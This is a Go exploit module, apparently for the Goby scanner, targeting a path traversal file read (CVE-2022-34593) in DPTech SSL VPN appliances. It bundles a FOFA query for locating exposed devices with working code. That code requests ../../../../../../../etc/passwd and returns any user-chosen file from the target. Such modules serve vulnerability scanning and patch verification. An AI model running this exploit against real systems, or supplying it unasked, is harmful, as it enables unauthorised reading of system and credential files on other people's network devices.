package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DPTech VPN File Read Vulnerability (CVE-2022-34593)",
    "Description": "<p>Hangzhou DPtech Co., Ltd. (referred to as \"DPtech\") takes the mission of \"making the network simpler, smarter, and safer\" and focuses on the field of network security and application delivery. It is a high-tech enterprise integrating R&amp;D, production and sales. Technology listed companies</p><p>There is a file reading vulnerability in the system, and attackers can use this vulnerability to obtain sensitive information of the system.</p>",
    "Product": "DPTECH-SSLVPN",
    "Homepage": "http://www.dptech.com/",
    "DisclosureDate": "2022-06-26",
    "Author": "2727227335@qq.com",
    "FofaQuery": "(banner=\"this is DPTECH\" && banner=\"SSLVPN\") || (title==\"SSL VPN Service\" && header=\"Dptech \") || cert=\"DPtechCa\"",
    "GobyQuery": "(banner=\"this is DPTECH\" && banner=\"SSLVPN\") || (title==\"SSL VPN Service\" && header=\"Dptech \") || cert=\"DPtechCa\"",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in the system, which can be used by attackers to obtain sensitive information of the system</p>",
    "Recommendation": "<p>1. The official has temporarily fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dptech.com/\">https://www.dptech.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-34593"
    ],
    "CNNVD": [
        "CNNVD-202207-2643"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "DPTech VPN 文件读取漏洞（CVE-2022-34593）",
            "Product": "DPTECH-SSLVPN",
            "Description": "<p>杭州迪普科技股份有限公司（简称“迪普科技”） 以“让网络更简单、智能、安全”为使命，聚焦于网络安全及应用交付领域，是一家集研发、生产、销售于一体的高科技上市企业<br></p><p>该系统存在文件读取漏洞,攻击者可利用该漏洞获取系统的敏感信息等.<br></p>",
            "Recommendation": "<p>1、官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a target=\"_Blank\" href=\"https://www.dptech.com/\">https://www.dptech.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>该系统存在文件读取漏洞,攻击者可利用该漏洞获取系统的敏感信息等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "DPTech VPN File Read Vulnerability (CVE-2022-34593)",
            "Product": "DPTECH-SSLVPN",
            "Description": "<p>Hangzhou DPtech Co., Ltd. (referred to as \"DPtech\") takes the mission of \"making the network simpler, smarter, and safer\" and focuses on the field of network security and application delivery. It is a high-tech enterprise integrating R&amp;D, production and sales. Technology listed companies</p><p>There is a file reading vulnerability in the system, and attackers can use this vulnerability to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. The official has temporarily fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dptech.com/\" target=\"_blank\">https://www.dptech.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a file reading vulnerability in the system, which can be used by attackers to obtain sensitive information of the system<br><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10829"
}`
	sendPayload1slaiweklnek := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(`/` + url.PathEscape(uri))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload1slaiweklnek(hostInfo, "../../../../../../../etc/passwd")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root:x:")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			resp, err := sendPayload1slaiweklnek(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				return expResult
			}
			expResult.Success = resp.StatusCode == 200
			expResult.Output = resp.Utf8Html
			return expResult
		},
	))
}
